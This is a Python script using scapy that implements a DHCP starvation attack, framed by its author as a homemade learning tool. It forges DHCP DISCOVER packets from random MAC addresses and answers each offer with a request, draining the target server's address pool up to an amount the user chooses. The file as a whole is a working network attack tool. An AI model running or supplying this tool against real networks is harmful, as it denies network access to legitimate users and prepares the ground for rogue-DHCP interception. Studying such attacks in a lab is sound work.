from scapy.all import *
from time import sleep
from threading import Thread
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import sys


class DHCPstarver(object):
    def __init__(self):
        self.mac = ['']
        self.src_mac = ''
        self.ip = []

    def get_input(self):
        print('Welcome to the homemade DHCP starver \n'
              'This Program is created for learning purposes \n'
              'Created by: Marc Hoogendoorn \n'
              '''Recources:
        https://www.netmanias.com/en/post/techdocs/5998/dhcp-network-protocol/understanding-the-basic-operations-of-dhcp
        ''')

        dhcp_server = input(
            '[?]Fill in the DHCP server that needs to be starved  \n \n :  ')
        amount = input('[?]Fill in the amount of addresses that needs to be starved\n \n :  ')

        return dhcp_server, amount

    def starve(self):

        dhcp_server, amount = self.get_input()
        self.start()

        while len(self.ip) < int(amount):
            # New mac_adress
            # Note: Kijken of er een manier is om de group addresse eruit te filteren.
            while self.src_mac in self.mac:
                self.src_mac = str(RandMAC())
            self.mac.append(self.src_mac)

            self.send_discover(dhcp_server)

            # Kan je op minder zetten maar heeft de kans om de router te overloaden voordat hij kan reageren
            sleep(1)

        sys.exit('[!]Max amount has been reached')

    def start(self):
        thread = Thread(target=self.listen)
        thread.start()

    def listen(self):
        sniff(filter="udp and (port 67 or port 68)",
              prn=self.handle_dhcp,
              store=0)

    def handle_dhcp(self, pkt):
        if pkt[DHCP]:
            if pkt[DHCP].options[0][1] == 2:
                self.handler_offer(offer_pkt=pkt)
            elif pkt[DHCP].options[0][1] == 5 or pkt[DHCP].options[0][1] == 6:
                self.handler_acknowledgement(ack_nak_pkt=pkt)

    def handler_offer(self, offer_pkt):
        print('[*]I have sended an offer towards the DHCP server ^^')

        # generate DHCP request packet dependend of the
        pkt = Ether(src=offer_pkt[BOOTP].chaddr.decode("utf-8"), dst="ff:ff:ff:ff:ff:ff")
        pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
        pkt /= UDP(sport=68, dport=67)
        pkt /= BOOTP(chaddr=offer_pkt[BOOTP].chaddr.decode("utf-8"), xid=offer_pkt[BOOTP].xid, flags=0xFFFFFF)
        pkt /= DHCP(options=[("message-type", "request"),
                             ("requested_addr", offer_pkt[BOOTP].yiaddr),
                             ("server_id", offer_pkt[DHCP].options[1][1]),
                             "end", "0"])

        sendp(pkt, verbose=False)

    def handler_acknowledgement(self, ack_nak_pkt):
        print('[*]I have recieved an Acknowledgement from the DHCP server :o')

        if ack_nak_pkt[DHCP].options[0][1] == 5:
            print("[*] Noitced ")
            self.ip.append(ack_nak_pkt[BOOTP].yiaddr)
            print(f'[*]{ack_nak_pkt[BOOTP].yiaddr}  I have recieved an acknowlegement from the DHCP server  '
                  f'there are now: {len(self.ip)} addresses starved! ')

        # Duplicate ACK may happen due to packet loss

        elif ack_nak_pkt[DHCP].options[0][1] == 6:
            print("[!]oh now :c we have recieved an NAK from the DHCP server  this is not good :C")

    def send_discover(self, requested_addr):

        # generate DHCP discover packet
        pkt = Ether(src=self.src_mac, dst="ff:ff:ff:ff:ff:ff")
        pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
        pkt /= UDP(sport=68, dport=67)
        pkt /= BOOTP(chaddr=self.src_mac, xid=random.randint(1, 900000000), flags=0xFFFFFF)
        pkt /= DHCP(options=[("message-type", "discover"),
                             ("requested_addr", requested_addr),
                             ("client_id", self.src_mac),
                             ("end", "0")])

        sendp(pkt, verbose=False)


if __name__ == '__main__':
    tool = DHCPstarver()
    tool.starve()
